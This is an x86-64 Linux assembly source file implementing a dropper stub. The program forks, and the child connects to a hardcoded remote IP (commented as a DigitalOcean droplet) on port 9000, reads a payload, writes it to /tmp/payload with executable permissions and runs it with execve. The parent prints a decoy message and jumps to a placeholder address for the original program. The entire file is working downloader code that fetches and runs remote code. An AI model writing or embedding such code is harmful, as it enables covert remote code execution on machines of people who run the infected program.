[bits 64]

global _start

_start: 
    mov rax, 57 ; fork
    syscall

    test rax, rax
    jnz original

    mov rax, 41 ; sys_socket
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov rbx, rax ; save socketfd in rbx

    mov rdi, rbx ; socketfd
    mov rax, 42 ; sys_connect
    sub rsp, 16
    mov word [rsp], 2
    mov word [rsp+2], 0x2823 ; port 9000 
    mov dword [rsp+4], 0xB7_D0_D1_86 ; digital ocean droplet ip
    mov rsi, rsp
    mov rdx, 16
    syscall

    ; above is opening a socket and connecting to it
    ; read bind_shell.asm to understand better it

    ; read(socketfd, buffer, length)
    xor rax, rax
    mov rdi, rbx
    sub rsp, 4096 ; allocate 4096 bytes
    mov rsi, rsp
    mov rdx, 4096
    syscall
    mov rbp, rax ; save bytes_read in rbp

    ; open("/tmp/payload", O_CREAT|O_WRONLY|O_TRUNC, 0755)
    mov rax, 2
    lea rdi, [rel path]
    ; O_CREAT = 64 (create file)
    ; O_WRONLY = 1 (write file)
    ; O_TRUNC = 512 (remove old content 
    mov rsi, 577
    mov rdx, 0o0755 ; make executable
    syscall ; rax will have filefd
    mov r12, rax ; save filefd in r12

    ; fchmod(filefd, 0755)
    mov rax, 91
    mov rdi, r12
    mov rsi, 0o0755
    syscall
    
    ; write(filefd, buffer, bytes_read)
    mov rax, 1
    mov rdi, r12
    mov rsi, rsp
    mov rdx, rbp
    syscall

    ; close(filefd)
    mov rax, 3
    mov rdi, r12
    syscall

    ; close(socketfd)
    mov rax, 3
    mov rdi, rbx
    syscall

    ; execve("/tmp/payload", ["/tmp/payload", null], null)
    xor rax, rax
    push rax
    lea rdi, [rel path]
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov rax, 59
    syscall

original:
    mov rax, 1 ; sys_write
    mov rdi, 1
    lea rsi, [rel text]
    mov rdx, text_end - text
    syscall

    mov rax, 0xDEADBEEFDEADBEEF
    jmp rax

text:
    db "installing dead beef...", 0x0A
text_end:

path:
    db "/tmp/payload", 0

